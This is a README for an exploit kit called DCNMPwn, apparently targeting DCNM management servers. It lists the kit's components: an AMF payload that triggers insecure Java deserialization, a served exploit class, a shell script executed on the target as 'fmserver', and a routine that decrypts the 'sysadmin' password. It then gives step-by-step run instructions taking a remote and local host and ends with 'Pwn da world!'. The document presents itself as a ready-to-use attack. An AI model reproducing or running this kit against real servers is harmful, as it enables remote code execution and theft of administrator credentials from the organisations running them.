* DCNMPwn.sh
    * Shell script which runs the exploit
* DCNMPwn
    *  Directory containing the IntelliJ IDEA project that sends the AMF payload to the server, triggering the insecure Java object deserialization
* ExploitTemplate.java
    * Exploit class template that will be compiled and served
* pwnedTemplate
    * Template for `pwned` shell script that will be executed in DCNM as the `fmserver` user
* DNCMCrypto.java
    * Source code for the `sysadmin` password decryption routine

Running the exploit:
1. Build DCNMPwn.jar with IntelliJ IDEA
2. Copy the jar from the project's `out` directory into the same directory as DCNMPwn.sh
3. Run ./DCNMPwn.sh <RHOST> <LHOST>
4. Pwn da world!
